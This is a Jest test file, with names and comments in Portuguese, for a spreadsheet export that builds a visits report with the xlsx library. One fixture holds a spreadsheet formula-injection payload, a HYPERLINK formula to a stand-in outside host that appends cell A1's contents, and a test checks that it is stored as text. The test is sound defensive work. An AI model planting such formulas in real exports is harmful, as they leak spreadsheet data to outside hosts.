/**
 * Planilha do painel montada com o `xlsx` real e lida de volta.
 */
import * as XLSX from 'xlsx';
import { celulaDaPlanilha, montarPlanilha } from '../planilha';
import { descreverFiltros } from '../relatorioService';
import type { RelatorioFiltros } from '@/types';

const colunas = ['Data', 'Agente', 'Status', 'Total', 'Observações'].map((c) => ({
  header: c,
  key: c,
}));

const linhas = [
  { Data: '13/10/2026', Agente: 'Ana', Status: 'Realizada', Total: 3, 'Observações': 'Tudo certo' },
  {
    Data: '02/11/2026',
    Agente: null,
    Status: 'Não encontrado',
    Total: 0,
    'Observações': '=HYPERLINK("http://fora.example/"&A1,"clique")',
  },
];

function gerar() {
  const livro = montarPlanilha(XLSX, linhas, 'Relatório de Visitas', colunas, [
    ['Período', '01/10/2026 a 30/11/2026'],
  ], '10/11/2026 13:17');
  const bytes = XLSX.write(livro, { type: 'array', bookType: 'xlsx' });
  return XLSX.read(bytes, { type: 'array', cellNF: true, cellStyles: true });
}

describe('celulaDaPlanilha', () => {
  it('vazio vira célula vazia, e não traço nem apóstrofo', () => {
    expect(celulaDaPlanilha(null)).toBeNull();
    expect(celulaDaPlanilha(undefined)).toBeNull();
    expect(celulaDaPlanilha('')).toBeNull();
  });

  it('número continua número, para a planilha conseguir somar', () => {
    expect(celulaDaPlanilha(12)).toEqual({ t: 'n', v: 12 });
  });

  it('data dd/mm/aaaa vira data do Excel, sem cair no dia anterior', () => {
    // 13/10/2026 é o dia 46308 contado a partir de 30/12/1899.
    expect(celulaDaPlanilha('13/10/2026')).toEqual({ t: 'n', v: 46308, z: 'dd/mm/yyyy' });
  });

  it('texto que parece fórmula fica texto declarado', () => {
    const c = celulaDaPlanilha('=1+1');
    expect(c).toEqual({ t: 's', v: '=1+1' });
  });
});

describe('montarPlanilha', () => {
  it('tem a aba de dados primeiro e a de informações depois', () => {
    expect(gerar().SheetNames).toEqual(['Relatório de Visitas', 'Informações']);
  });

  it('mostra a data formatada e sem apóstrofo em lugar nenhum', () => {
    const livro = gerar();
    const dados = XLSX.utils.sheet_to_json<Record<string, string>>(
      livro.Sheets['Relatório de Visitas'],
      { raw: false }
    );

    expect(dados.map((d) => d['Data'])).toEqual(['13/10/2026', '02/11/2026']);
    expect(dados[1]['Agente']).toBeUndefined();
    expect(JSON.stringify(dados)).not.toContain("'");
  });

  it('não grava fórmula a partir de texto digitado', () => {
    const aba = gerar().Sheets['Relatório de Visitas'];
    expect(aba['E3'].t).toBe('s');
    expect(aba['E3'].f).toBeUndefined();
  });

  it('tem filtro no cabeçalho e largura limitada', () => {
    const aba = gerar().Sheets['Relatório de Visitas'];

    expect(aba['!autofilter']?.ref).toBe('A1:E3');
    const larguras = (aba['!cols'] ?? []).map((c) => c.wch ?? 0);
    expect(larguras).toHaveLength(5);
    for (const l of larguras) {
      expect(l).toBeGreaterThanOrEqual(10);
      expect(l).toBeLessThanOrEqual(60);
    }
  });

  it('a aba de informações traz quando, quais filtros e quantos registros', () => {
    const info = XLSX.utils.sheet_to_json<string[]>(gerar().Sheets['Informações'], {
      header: 1,
      raw: false,
    });
    const valor = (rotulo: string) => info.find((l) => l[0] === rotulo)?.[1];

    expect(info[0][0]).toBe('Relatório de Visitas');
    expect(valor('Gerado em')).toBe('10/11/2026 13:17');
    expect(valor('Período')).toBe('01/10/2026 a 30/11/2026');
    expect(valor('Total de registros')).toBe('2');
  });
});

describe('descreverFiltros', () => {
  const base: RelatorioFiltros = {
    tipo: 'visitas',
    formato: 'excel',
    periodo_inicio: '',
    periodo_fim: '',
  };

  it('sem período escolhido, diz que é todo o histórico', () => {
    expect(descreverFiltros('visitas', base, [])).toEqual([['Período', 'Todo o histórico']]);
  });

  it('descreve período, status traduzido e o nome do agente', () => {
    const info = descreverFiltros(
      'visitas',
      { ...base, periodo_inicio: '2026-10-01', periodo_fim: '2026-10-31', status: 'nao_encontrado', agente_id: 'a1' },
      [{ Agente: 'Ana' }]
    );

    expect(info).toEqual([
      ['Período', '01/10/2026 a 31/10/2026'],
      ['Situação', 'Não encontrado'],
      ['Agente', 'Ana'],
    ]);
  });

  it('relatório sem período não ganha a linha de período', () => {
    expect(descreverFiltros('cobertura', base, [])).toEqual([]);
  });
});
